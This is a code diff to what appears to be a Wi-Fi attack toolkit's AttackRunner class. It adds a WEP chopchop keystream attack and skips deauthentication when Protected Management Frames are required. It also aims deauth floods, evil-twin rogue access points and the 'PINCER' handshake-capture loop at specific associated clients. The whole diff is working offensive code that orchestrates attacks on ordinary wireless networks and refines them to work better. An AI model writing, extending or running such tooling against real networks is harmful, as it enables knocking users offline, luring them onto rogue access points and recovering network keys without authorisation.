@@ -61,10 +61,26 @@ class AttackRunner:
     # Deauthentication
     # ------------------------------------------------------------------
 
+    def _pmf_block_message(self, ap) -> str | None:
+        """None if deauth is worth attempting against ap, else the reason
+        it isn't -- same `secure.recommend_attack()` call run_smart() uses,
+        so every deauth entry point (manual buttons included, 2026-08-30)
+        gives the identical PMF-aware verdict instead of each one silently
+        sending frames the 2026-08-30 hwsim test proved have zero effect."""
+        if ap.pmf != "required":
+            return None
+        from ..secure import recommend_attack
+
+        return recommend_attack(ap)["reason"]
+
     def deauth_all(self, ap) -> str:
         from ..attacks.deauth import deauth
         from ..frames import BROADCAST
 
+        block = self._pmf_block_message(ap)
+        if block:
+            self._progress_fn(f"deauth: PMF required, skipping — {block}")
+            return f"skipped — {block}"
         sent = deauth(
             self._iface, ap.bssid, client=BROADCAST, count=64, channel=ap.channel,
             progress_fn=self._progress_fn,
@@ -74,6 +90,10 @@ class AttackRunner:
     def deauth_client(self, ap, client: str) -> str:
         from ..attacks.deauth import deauth
 
+        block = self._pmf_block_message(ap)
+        if block:
+            self._progress_fn(f"deauth: PMF required, skipping — {block}")
+            return f"skipped — {block}"
         sent = deauth(
             self._iface, ap.bssid, client=client, count=64, channel=ap.channel,
             progress_fn=self._progress_fn,
@@ -169,6 +189,15 @@ class AttackRunner:
         )
         return key.hex() if key else "no key recovered"
 
+    def chopchop(self, ap) -> str:
+        from ..attacks.wep_client import chopchop_vendor
+
+        result = chopchop_vendor(
+            self._iface, ap.bssid, self._mac, channel=ap.channel,
+            stop_event=self._stop_event, progress_fn=self._progress_fn,
+        )
+        return f"keystream saved to {result}" if result else "no packet decrypted"
+
     # ------------------------------------------------------------------
     # WPS
     # ------------------------------------------------------------------
@@ -217,13 +246,20 @@ class AttackRunner:
 
     def eviltwin(self, ap, iface_ap: str) -> str:
         from ..attacks.eviltwin import run_eviltwin
+        from ..frames import BROADCAST
 
+        if ap.pmf == "required":
+            self._progress_fn(
+                "eviltwin: PMF required on the real AP — deauth rounds will be dropped, "
+                "clients will only drift to the rogue AP if they reconnect on their own"
+            )
         result = run_eviltwin(
             iface_ap=iface_ap,
             iface_mon=self._iface,
             bssid=ap.bssid,
             ssid=ap.ssid,
             channel=ap.channel or 6,
+            client=next(iter(ap.clients), BROADCAST),
             stop_event=self._stop_event,
             progress_fn=self._progress_fn,
         )
@@ -252,8 +288,13 @@ class AttackRunner:
                watch_capture_fn: Callable[[str, threading.Event], None]) -> str:
         from ..attacks.deauth import deauth
         from ..attacks.handshake import HandshakeStatus, capture_handshake
+        from ..frames import BROADCAST
         from ..radio import ensure_channel, get_mode, set_managed_mode, set_monitor_mode
         from ..storage import target_capture_dir
+
+        if ap.pmf == "required":
+            self._log("PINCER: PMF required — deauth would be dropped, skipping round loop entirely")
+            return "skipped — PMF required, deauth would be dropped"
 
         max_rounds = 12
         interval = 10
@@ -297,14 +338,15 @@ class AttackRunner:
                 if self._stop_event.is_set():
                     self._log(f"PINCER: stop requested before round {round_n + 1}/{max_rounds}")
                     break
-                sent = deauth(attack_mon, ap.bssid, channel=ap.channel, progress_fn=self._log)
+                client = next(iter(ap.clients), BROADCAST)
+                sent = deauth(attack_mon, ap.bssid, client=client, channel=ap.channel, progress_fn=self._log)
                 if sent == 0:
                     self._log(
                         f"PINCER round {round_n + 1}/{max_rounds}: deauth did NOT go out "
-                        f"({attack_mon} -> {ap.bssid}) — see the warning above"
+                        f"({attack_mon} -> {client}) — see the warning above"
                     )
                 else:
-                    self._log(f"PINCER round {round_n + 1}/{max_rounds}: sent {sent} deauth frame(s) ({attack_mon} -> {ap.bssid})")
+                    self._log(f"PINCER round {round_n + 1}/{max_rounds}: sent {sent} deauth frame(s) ({attack_mon} -> {client})")
                 cap = result.get("cap")
                 if cap is not None:
                     statuses = {(a, c): cap.status(a, c).value for a, c in cap.messages}
